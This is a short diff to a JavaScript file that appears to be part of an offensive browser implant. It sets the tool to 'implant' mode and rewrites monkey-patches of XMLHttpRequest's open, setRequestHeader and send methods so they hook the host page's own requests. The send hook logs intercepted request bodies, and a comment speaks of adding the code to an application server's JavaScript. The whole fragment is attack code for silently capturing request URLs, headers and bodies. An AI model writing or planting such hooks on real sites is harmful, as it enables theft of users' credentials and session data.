@@ -17,7 +17,7 @@ function initGlobals()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "trap";
+	window.taperMode = "implant";
 
 
 	if (window.taperMode === "trap")
@@ -742,16 +742,18 @@ function monkeyPatch()
 
 	if (window.taperMode === "trap")
 	{
-		myReference = document.getElementById("iframe_a");
+		// myReference = document.getElementById("iframe_a");
+		myReference = document.getElementById("iframe_a").contentWindow.XMLHttpRequest;
 	}
 	else
 	{
-		myReference = document;
+		myReference = XMLHttpRequest;;
 	}
 
 
 	//Monkey patch open
-	myReference.contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
+	// myReference.contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
+	myReference.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
 		var url = arguments[1];
@@ -779,7 +781,7 @@ function monkeyPatch()
 
 
 	// Monkey patch setRequestHeader
-	myReference.contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
+	myReference.prototype.setRequestHeader = function (header, value)
 	{
 		var header = arguments[0];
 		var value  = arguments[1];
@@ -807,7 +809,7 @@ function monkeyPatch()
 
 
   	// Monkey patch send
-	myReference.contentWindow.XMLHttpRequest.prototype.send = function(data) 
+	myReference.prototype.send = function(data) 
 	{
 		console.log("Intercepted request body: " + data);
 
